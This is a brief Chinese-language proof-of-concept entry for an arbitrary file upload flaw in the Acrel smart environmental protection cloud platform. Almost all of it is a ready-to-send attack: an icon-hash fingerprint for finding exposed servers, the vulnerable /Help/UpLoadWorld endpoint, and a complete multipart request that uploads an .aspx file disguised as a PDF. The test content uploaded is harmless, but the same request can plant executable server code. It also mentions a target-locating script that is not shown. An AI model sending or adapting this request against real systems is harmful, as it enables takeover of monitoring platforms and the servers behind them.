# 安科瑞-智能环保云平台uploadworld存在任意文件上传漏洞

- **系统**：安科瑞-智能环保云平台　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`icon_hash="-1201212481"`
- **请求**：`POST /Help/UpLoadWorld HTTP/1.1`
- **关键头**：`Content-Length: 628`　`Content-Type: multipart/form-data; boundary=----fhc8nifu2wn7cspvush5`

**请求体 / payload**
```
------fhc8nifu2wn7cspvush5
Content-Disposition: form-data; name="id"
WU_FILE_0
------fhc8nifu2wn7cspvush5
Content-Disposition: form-data; name="name"
9b1ukpmjr1.aspx
------fhc8nifu2wn7cspvush5
Content-Disposition: form-data; name="type"
application/pdf
------fhc8nifu2wn7cspvush5
Content-Disposition: form-data; name="lastModifiedDate"
Sun Jan 05 2025 19:55:42
------fhc8nifu2wn7cspvush5
Content-Disposition: form-data; name="size"
637
------fhc8nifu2wn7cspvush5
Content-Disposition: form-data; name="file"; filename="testa.aspx"
Content-Type: application/pdf
123456
------fhc8nifu2wn7cspvush5--
上传定位…（脚本共 714 字，完整版见原文）
```
- **预期**：200　|　—